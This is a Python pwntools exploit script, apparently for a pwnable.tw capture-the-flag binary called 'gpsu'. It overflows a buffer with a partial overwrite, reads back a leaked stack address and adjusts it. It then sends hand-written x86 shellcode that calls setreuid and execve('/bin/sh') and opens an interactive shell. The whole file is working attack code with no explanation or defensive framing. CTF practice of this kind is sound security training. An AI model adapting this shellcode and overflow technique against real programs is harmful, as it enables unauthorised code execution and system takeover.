from pwn import *

context.terminal = ["/bin/bash", "-c"]
io = gdb.debug("./gpsu")
#io = remote('chall.pwnable.tw', 10000)

io.recv()

io.send('\x61' * 20 + '\x87' )

stack_pos = io.recv(4)
stack_pos = chr(ord(stack_pos[0]) + 4) + stack_pos[1:]
print(len(stack_pos))
io.send('\x31\xc0\xb0\x46\x31\xc9\xcd\x80\xe8\x0b\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68' + stack_pos + '\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80')
io.interactive()